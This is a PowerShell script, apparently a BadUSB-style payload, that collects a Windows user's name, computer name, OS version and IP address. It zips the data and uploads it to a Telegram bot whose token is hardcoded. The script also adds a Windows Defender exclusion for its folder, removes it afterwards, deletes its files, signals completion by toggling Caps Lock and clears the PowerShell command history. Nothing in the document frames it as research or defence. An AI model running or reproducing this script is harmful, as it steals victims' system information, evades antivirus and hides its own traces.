
$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force
#Extract data
try {
    $userName = $env:USERNAME
    $computerName = $env:COMPUTERNAME
    $dateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|Teredo' } | Select-Object -First 1).IPAddress

    $sysInfo = @"
User Name: $userName
Computer Name: $computerName
Date/Time: $dateTime
OS Version: $osVersion
IP Address: $ipAddress
"@

    $sysInfo | Out-File -FilePath "$dumpFolder\system_info.txt" -Encoding UTF8
} catch {}


# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# Telegram configuration
$token = "8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o"
$chatID = "<7398435102>"
$uri = "https://api.telegram.org/bot8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o/sendDocument"
$caption = "Here are exfiltrated informations from $env:USERNAME"

# Check if the file exists before sending
if (!(Test-Path $dumpFile)) {
    exit 1
}

# Ensure System.Net.Http is available
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) {
        Add-Type -Path $httpPath
    } else {
        exit 1
    }
}

# Create HTTP client
$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")

# Attach the ZIP file
$filename = [System.IO.Path]::GetFileName("$dumpFile")
$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "document", $filename)

# Send data to Telegram
try {
    $client.PostAsync($uri, $content).Wait()
} catch {}

# Cleanup
$fileStream.Close()
$fileStream.Dispose()

Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear command history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit
